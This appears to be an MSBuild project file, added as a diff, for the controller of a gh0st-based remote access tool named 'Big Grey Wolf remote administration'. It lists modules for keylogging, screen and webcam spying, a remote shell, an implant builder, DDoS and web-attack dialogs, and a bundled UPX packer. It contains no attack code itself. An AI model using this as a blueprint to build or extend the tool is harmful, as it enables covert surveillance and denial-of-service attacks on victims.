@@ -1,0 +1,334 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <SccProjectName />
+    <SccLocalPath />
+    <Keyword>MFCProj</Keyword>
+    <ProjectName>DHL_yk.vs10</ProjectName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseOfMfc>Dynamic</UseOfMfc>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseOfMfc>Dynamic</UseOfMfc>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+    <Import Project="$(VCTargetsPath)Microsoft.Cpp.UpgradeFromVC60.props" />
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+    <Import Project="$(VCTargetsPath)Microsoft.Cpp.UpgradeFromVC60.props" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <OutDir>..\bin\</OutDir>
+    <IntDir>.\vs10_Release\</IntDir>
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <OutDir>..\bin\</OutDir>
+    <IntDir>.\vs10_Debug\</IntDir>
+    <LinkIncremental>false</LinkIncremental>
+    <ExcludePath>$(ExcludePath)</ExcludePath>
+    <EmbedManifest>false</EmbedManifest>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
+      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
+      <StringPooling>true</StringPooling>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <Optimization>MinSpace</Optimization>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <AdditionalIncludeDirectories>../common;../../include/ToolkitPro1501;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AssemblerListingLocation>.\vs10_Release\</AssemblerListingLocation>
+      <BrowseInformation>true</BrowseInformation>
+      <PrecompiledHeaderOutputFile>.\vs10_Release\DHL_yk.pch</PrecompiledHeaderOutputFile>
+      <ObjectFileName>.\vs10_Release\</ObjectFileName>
+      <ProgramDataBaseFileName>.\vs10_Release\</ProgramDataBaseFileName>
+    </ClCompile>
+    <Midl>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <TypeLibraryName>.\Release\DHL_yk.tlb</TypeLibraryName>
+      <MkTypLibCompatible>true</MkTypLibCompatible>
+      <TargetEnvironment>Win32</TargetEnvironment>
+    </Midl>
+    <ResourceCompile>
+      <Culture>0x0804</Culture>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ResourceCompile>
+    <Bscmake>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <OutputFile>.\vs10_Release\DHL_yk.bsc</OutputFile>
+    </Bscmake>
+    <Link>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <SubSystem>Windows</SubSystem>
+      <IgnoreSpecificDefaultLibraries>%(IgnoreSpecificDefaultLibraries)</IgnoreSpecificDefaultLibraries>
+      <OutputFile>../Bin/大灰狼远程管理.exe</OutputFile>
+      <AdditionalDependencies>../../lib/ToolkitPro1501vc100.lib;../../lib/G729a.lib;../../lib/UUID.LIB;../../lib/zlib.lib;../../lib/SkinH.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
+      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
+      <FunctionLevelLinking>false</FunctionLevelLinking>
+      <Optimization>Disabled</Optimization>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <DebugInformationFormat>EditAndContinue</DebugInformationFormat>
+      <AdditionalIncludeDirectories>../common;../../include/ToolkitPro1501;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AssemblerListingLocation>.\vs10_Debug\</AssemblerListingLocation>
+      <BrowseInformation>true</BrowseInformation>
+      <PrecompiledHeaderOutputFile>.\vs10_Debug\DHL_yk.pch</PrecompiledHeaderOutputFile>
+      <ObjectFileName>.\vs10_Debug\</ObjectFileName>
+      <ProgramDataBaseFileName>.\vs10_Debug\</ProgramDataBaseFileName>
+    </ClCompile>
+    <Midl>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <TypeLibraryName>.\Win32_Debug\DHL_yk.tlb</TypeLibraryName>
+      <MkTypLibCompatible>true</MkTypLibCompatible>
+      <TargetEnvironment>Win32</TargetEnvironment>
+    </Midl>
+    <ResourceCompile>
+      <Culture>0x0804</Culture>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ResourceCompile>
+    <Bscmake>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <OutputFile>.\vs10_Debug\DHL_yk.bsc</OutputFile>
+    </Bscmake>
+    <Link>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <SubSystem>Windows</SubSystem>
+      <IgnoreSpecificDefaultLibraries>%(IgnoreSpecificDefaultLibraries)</IgnoreSpecificDefaultLibraries>
+      <OutputFile>../Bin/大灰狼远程管理.exe</OutputFile>
+      <AdditionalDependencies>../../lib/ToolkitPro1501vc100.lib;../../lib/G729a.lib;../../lib/UUID.LIB;../../lib/zlib.lib;../../lib/SkinH.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <IgnoreAllDefaultLibraries>
+      </IgnoreAllDefaultLibraries>
+      <ShowProgress>NotSet</ShowProgress>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="..\common\AudioCode.cpp" />
+    <ClCompile Include="AudioDlg.cpp" />
+    <ClCompile Include="BmpToAvi.cpp" />
+    <ClCompile Include="include\Buffer.cpp" />
+    <ClCompile Include="BuildServer1.cpp" />
+    <ClCompile Include="ChangeGroup.cpp" />
+    <ClCompile Include="include\CpuUsage.cpp" />
+    <ClCompile Include="DDOSAttackDlg.cpp" />
+    <ClCompile Include="DHL_yk.cpp" />
+    <ClCompile Include="Dib.cpp" />
+    <ClCompile Include="FileManagerDlg.cpp" />
+    <ClCompile Include="FileTransferModeDlg.cpp" />
+    <ClCompile Include="Filter.cpp" />
+    <ClCompile Include="FlowAttackDlg.cpp" />
+    <ClCompile Include="gh0stDoc.cpp" />
+    <ClCompile Include="gh0stView.cpp" />
+    <ClCompile Include="Icons.cpp" />
+    <ClCompile Include="IniFile.cpp" />
+    <ClCompile Include="InputDlg.cpp" />
+    <ClCompile Include="include\IOCPServer.cpp" />
+    <ClCompile Include="KeyBoardDlg.cpp" />
+    <ClCompile Include="LogView.cpp" />
+    <ClCompile Include="MainFrm.cpp" />
+    <ClCompile Include="MD5.CPP" />
+    <ClCompile Include="MsgBox.cpp" />
+    <ClCompile Include="MyToolsKit.cpp" />
+    <ClCompile Include="PcView.cpp" />
+    <ClCompile Include="proxy.cpp" />
+    <ClCompile Include="RegDataDlg.cpp" />
+    <ClCompile Include="RegDlg.cpp" />
+    <ClCompile Include="SafeDynMem.cpp" />
+    <ClCompile Include="ScreenSpyDlg.cpp" />
+    <ClCompile Include="SerAttribDlg.cpp" />
+    <ClCompile Include="SerManager.cpp" />
+    <ClCompile Include="SettingDlg.cpp" />
+    <ClCompile Include="SEU_QQwry.cpp" />
+    <ClCompile Include="ShellDlg.cpp" />
+    <ClCompile Include="ShowNum.cpp" />
+    <ClCompile Include="StdAfx.cpp">
+      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
+      <PrecompiledHeaderFile Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">stdafx.h</PrecompiledHeaderFile>
+      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
+      <PrecompiledHeaderFile Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">stdafx.h</PrecompiledHeaderFile>
+    </ClCompile>
+    <ClCompile Include="SystemDlg.cpp" />
+    <ClCompile Include="TrueColorToolBar.cpp" />
+    <ClCompile Include="UPDATEIP.cpp" />
+    <ClCompile Include="User.cpp" />
+    <ClCompile Include="WaveIn.cpp" />
+    <ClCompile Include="WaveOut.cpp" />
+    <ClCompile Include="WebAttackDlg.cpp" />
+    <ClCompile Include="WebCamDlg.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="DHL_yk.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\common\AudioCode.h" />
+    <ClInclude Include="AudioDlg.h" />
+    <ClInclude Include="BmpToAvi.h" />
+    <ClInclude Include="include\Buffer.h" />
+    <ClInclude Include="BuildServer1.h" />
+    <ClInclude Include="ChangeGroup.h" />
+    <ClInclude Include="DDOSAttackDlg.h" />
+    <ClInclude Include="DHL_yk.h" />
+    <ClInclude Include="Dib.h" />
+    <ClInclude Include="EasySize.h" />
+    <ClInclude Include="FileManagerDlg.h" />
+    <ClInclude Include="FileTransferModeDlg.h" />
+    <ClInclude Include="Filter.h" />
+    <ClInclude Include="FlowAttackDlg.h" />
+    <ClInclude Include="gh0stDoc.h" />
+    <ClInclude Include="gh0stView.h" />
+    <ClInclude Include="Icons.h" />
+    <ClInclude Include="IniFile.h" />
+    <ClInclude Include="include\IOCPServer.h" />
+    <ClInclude Include="KeyBoardDlg.h" />
+    <ClInclude Include="LogView.h" />
+    <ClInclude Include="..\common\macros.h" />
+    <ClInclude Include="MainFrm.h" />
+    <ClInclude Include="MsgBox.h" />
+    <ClInclude Include="MyToolsKit.h" />
+    <ClInclude Include="PcView.h" />
+    <ClInclude Include="proxy.h" />
+    <ClInclude Include="RegDataDlg.h" />
+    <ClInclude Include="RegDlg.h" />
+    <ClInclude Include="Resource.h" />
+    <ClInclude Include="SafeDynMem.h" />
+    <ClInclude Include="ScreenSpyDlg.h" />
+    <ClInclude Include="SerAttribDlg.h" />
+    <ClInclude Include="SerManager.h" />
+    <ClInclude Include="SettingDlg.h" />
+    <ClInclude Include="SEU_QQwry.h" />
+    <ClInclude Include="ShellDlg.h" />
+    <ClInclude Include="ShowNum.h" />
+    <ClInclude Include="SkinH.h" />
+    <ClInclude Include="StdAfx.h" />
+    <ClInclude Include="SystemDlg.h" />
+    <ClInclude Include="TrueColorToolBar.h" />
+    <ClInclude Include="UPDATEIP.h" />
+    <ClInclude Include="User.h" />
+    <ClInclude Include="WaveIn.h" />
+    <ClInclude Include="WaveOut.h" />
+    <ClInclude Include="WebAttackDlg.h" />
+    <ClInclude Include="WebCamDlg.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <CustomBuild Include="res\1.cur" />
+    <CustomBuild Include="res\102.ico" />
+    <CustomBuild Include="res\ico2\11.ico" />
+    <CustomBuild Include="res\196.bmp" />
+    <CustomBuild Include="res\2.cur" />
+    <CustomBuild Include="res\202.ico" />
+    <CustomBuild Include="res\ico2\22.ico" />
+    <CustomBuild Include="res\3.cur" />
+    <CustomBuild Include="res\4.cur" />
+    <CustomBuild Include="res\9428.ico" />
+    <CustomBuild Include="res\ico2\9683.ico" />
+    <CustomBuild Include="res\SysInfo\AppWindows.ico" />
+    <CustomBuild Include="res\audio.ico" />
+    <CustomBuild Include="res\Becareful.ico" />
+    <CustomBuild Include="res\bitmap3.bmp" />
+    <CustomBuild Include="res\Bitmap_4.bmp" />
+    <CustomBuild Include="res\Bitmap_5.bmp" />
+    <CustomBuild Include="res\ico3\Burn.ico" />
+    <CustomBuild Include="res\cmdshell.ico" />
+    <CustomBuild Include="res\CS icon.ico" />
+    <CustomBuild Include="res\ddd.bmp" />
+    <CustomBuild Include="res\default1.bin">
+      <FileType>Document</FileType>
+    </CustomBuild>
+    <CustomBuild Include="res\dot.cur" />
+    <CustomBuild Include="res\dword.ico" />
+    <CustomBuild Include="res\event.ico" />
+    <CustomBuild Include="res\EventError.ico" />
+    <CustomBuild Include="res\gh0st.ico" />
+    <CustomBuild Include="res\gh0st.rc2">
+      <FileType>RC</FileType>
+    </CustomBuild>
+    <CustomBuild Include="res\icon2.ico" />
+    <CustomBuild Include="res\SysInfo\Informacion.ico" />
+    <CustomBuild Include="res\keyboard.ico" />
+    <CustomBuild Include="res\Logo.bmp" />
+    <CustomBuild Include="res\monitor.ico" />
+    <CustomBuild Include="res\mytool.bmp" />
+    <CustomBuild Include="res\n_ip.ico" />
+    <CustomBuild Include="res\SysInfo\Process.ico" />
+    <CustomBuild Include="res\regedit.ico" />
+    <CustomBuild Include="res\regsz.ico" />
+    <CustomBuild Include="res\remote.ico" />
+    <CustomBuild Include="res\SysInfo\ScreenSize.ico" />
+    <CustomBuild Include="res\SysInfo\Services.ico" />
+    <CustomBuild Include="res\SHIPIN.ico" />
+    <CustomBuild Include="res\syskm.ico" />
+    <CustomBuild Include="res\system.ico" />
+    <CustomBuild Include="res\systray.ico" />
+    <CustomBuild Include="res\systray1.ico" />
+    <CustomBuild Include="res\toolbar.bmp" />
+    <CustomBuild Include="res\toolbar1.bmp" />
+    <CustomBuild Include="res\toolbar2.bmp" />
+    <CustomBuild Include="res\toolbar3.bmp" />
+    <CustomBuild Include="res\toolbar4.bmp" />
+    <CustomBuild Include="res\ToolbarLarge.bmp" />
+    <CustomBuild Include="res\USER.ico" />
+    <CustomBuild Include="res\w_ip.ico" />
+    <CustomBuild Include="res\webcam.ico" />
+    <CustomBuild Include="res\启动.bmp" />
+    <CustomBuild Include="res\实用工具.ico" />
+    <CustomBuild Include="res\文件夹1.ico" />
+    <CustomBuild Include="res\文件夹2.ico" />
+    <CustomBuild Include="res\无视频.ico" />
+    <CustomBuild Include="res\用户.ico" />
+    <CustomBuild Include="res\ico2\用户0.ico" />
+    <CustomBuild Include="res\有视频.ico" />
+    <CustomBuild Include="res\aero.she">
+      <FileType>Document</FileType>
+    </CustomBuild>
+    <CustomBuild Include="res\Login.wav">
+      <FileType>Document</FileType>
+    </CustomBuild>
+    <CustomBuild Include="res\Offline.wav">
+      <FileType>Document</FileType>
+    </CustomBuild>
+    <CustomBuild Include="res\Setting.wav">
+      <FileType>Document</FileType>
+    </CustomBuild>
+    <CustomBuild Include="res\ico3\SmallIcons.png">
+      <FileType>Document</FileType>
+    </CustomBuild>
+    <CustomBuild Include="res\upx.exe">
+      <FileType>Document</FileType>
+    </CustomBuild>
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
